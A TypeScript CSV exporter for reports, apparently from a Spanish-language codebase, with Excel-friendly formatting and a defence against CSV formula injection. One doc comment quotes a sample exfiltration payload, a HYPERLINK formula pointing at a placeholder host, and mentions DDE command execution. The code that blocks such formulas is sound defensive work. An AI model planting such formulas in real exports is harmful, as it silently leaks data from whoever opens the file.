import type {
  ColumnaReporte,
  FormatoExportacion,
  ReporteDTO,
  ValorCelda,
} from '../../../compartido/tipos.js';
import { Exportador } from './Exportador.js';

/**
 * Punto y coma, no coma.
 *
 * Excel elige el separador de listas segun la configuracion regional, y en
 * es-AR / es-ES ese separador es ';'. Con ',' el archivo se abre con todo
 * amontonado en la columna A. Ademas nuestros numeros usan la coma como
 * separador decimal, con lo que un CSV separado por comas obligaria a
 * entrecomillar practicamente cada importe.
 */
const SEPARADOR = ';';

/** RFC 4180 exige CRLF, y es lo unico que Excel interpreta sin dudar. */
const FIN_LINEA = '\r\n';

/**
 * Marca de orden de bytes UTF-8. Sin ella Excel asume la pagina de codigos
 * local (Windows-1252) y destroza cualquier caracter no ASCII del reporte.
 */
const BOM = Uint8Array.of(0xef, 0xbb, 0xbf);

/** Etiqueta de la fila final de totales. */
const ETIQUETA_TOTALES = 'TOTALES';

/** Caracteres con los que una hoja de calculo empieza a leer una formula. */
const INICIOS_PELIGROSOS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Prevencion de inyeccion de formulas (CSV injection).
 *
 * Excel, LibreOffice y Sheets evaluan como formula toda celda que empiece por
 * '=', '+', '-', '@', TAB o CR. Un empleado que escriba
 * `=HYPERLINK("http://malo/"&A1,"ok")` en la descripcion de una tarea consigue
 * que se ejecute en la maquina de quien abra el reporte: exfiltracion de datos
 * en silencio y, via DDE, ejecucion de comandos. El apostrofo inicial obliga a
 * la hoja de calculo a tratar la celda como texto literal.
 */
function neutralizarFormula(texto: string): string {
  const primero = texto.slice(0, 1);
  return INICIOS_PELIGROSOS.includes(primero) ? `'${texto}` : texto;
}

/**
 * Escapado RFC 4180: solo hace falta entrecomillar si el campo lleva el
 * separador, comillas o un salto de linea; las comillas internas se duplican.
 */
function escaparCampo(campo: string): string {
  const necesitaComillas =
    campo.includes(SEPARADOR) ||
    campo.includes('"') ||
    campo.includes('\n') ||
    campo.includes('\r');
  return necesitaComillas ? `"${campo.replace(/"/g, '""')}"` : campo;
}

/**
 * Exportacion a CSV pensada para abrirse en Excel sin retoques: BOM UTF-8,
 * separador ';', fin de linea CRLF y escapado RFC 4180.
 */
export class ExportadorCSV extends Exportador {
  override get formato(): FormatoExportacion {
    return 'csv';
  }

  override get tipoMime(): string {
    return 'text/csv; charset=utf-8';
  }

  override get extension(): string {
    return 'csv';
  }

  override async exportar(reporte: ReporteDTO): Promise<Uint8Array> {
    const lineas: string[] = [];

    const cabecera = reporte.columnas.map((columna) =>
      escaparCampo(neutralizarFormula(columna.titulo)),
    );
    lineas.push(cabecera.join(SEPARADOR));

    for (const fila of reporte.filas) {
      lineas.push(
        reporte.columnas
          // Indexar un Record devuelve `undefined` si la clave falta: una fila
          // incompleta debe salir como celda vacia, no como "undefined".
          .map((columna) => this.celda(fila[columna.clave] ?? null, columna))
          .join(SEPARADOR),
      );
    }

    if (Object.keys(reporte.totales).length > 0) {
      lineas.push(this.filaTotales(reporte));
    }

    const cuerpo = new TextEncoder().encode(lineas.join(FIN_LINEA) + FIN_LINEA);
    const salida = new Uint8Array(BOM.length + cuerpo.length);
    salida.set(BOM, 0);
    salida.set(cuerpo, BOM.length);
    return salida;
  }

  private filaTotales(reporte: ReporteDTO): string {
    return reporte.columnas
      .map((columna, indice) => {
        // La etiqueta pisa la primera columna aunque esa columna tenga total:
        // sin ella la ultima fila parece un registro mas del listado.
        if (indice === 0) return escaparCampo(ETIQUETA_TOTALES);
        return this.celda(reporte.totales[columna.clave] ?? null, columna);
      })
      .join(SEPARADOR);
  }

  private celda(valor: ValorCelda, columna: ColumnaReporte): string {
    const texto = this.formatearCelda(valor, columna);
    // Solo el texto de origen puede traer una formula; numeros, booleanos y
    // fechas los redacta la clase base. Neutralizar tambien esos romperia todo
    // importe negativo, que ya empieza por '-'.
    return escaparCampo(typeof valor === 'string' ? neutralizarFormula(texto) : texto);
  }
}
